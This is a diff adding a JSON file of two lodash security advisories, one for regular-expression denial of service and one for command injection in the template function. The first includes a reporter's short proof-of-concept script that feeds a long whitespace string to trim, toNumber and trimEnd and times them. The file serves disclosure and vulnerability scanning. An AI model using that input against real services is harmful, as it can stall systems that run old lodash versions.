@@ -1,0 +1,16 @@
+{
+  "vulns": [
+    {
+      "id": "GHSA-29mw-wpgm-hmr9",
+      "summary": "Regular Expression Denial of Service (ReDoS) in lodash",
+      "details": "All versions of package lodash prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd` functions. \n\nSteps to reproduce (provided by reporter Liyuan Chen):\n```js\nvar lo = require('lodash');\n\nfunction build_blank(n) {\n    var ret = \"1\"\n    for (var i = 0; i < n; i++) {\n        ret += \" \"\n    }\n    return ret + \"1\";\n}\nvar s = build_blank(50000) var time0 = Date.now();\nlo.trim(s) \nvar time_cost0 = Date.now() - time0;\nconsole.log(\"time_cost0: \" + time_cost0);\nvar time1 = Date.now();\nlo.toNumber(s) var time_cost1 = Date.now() - time1;\nconsole.log(\"time_cost1: \" + time_cost1);\nvar time2 = Date.now();\nlo.trimEnd(s);\nvar time_cost2 = Date.now() - time2;\nconsole.log(\"time_cost2: \" + time_cost2);\n```",
+      "modified": "2025-09-29T21:12:31.102523Z"
+    },
+    {
+      "id": "GHSA-35jh-r3h4-6jhm",
+      "summary": "Command Injection in lodash",
+      "details": "`lodash` versions prior to 4.17.21 are vulnerable to Command Injection via the template function.",
+      "modified": "2026-07-08T18:29:36.682352320Z"
+    }
+  ]
+}
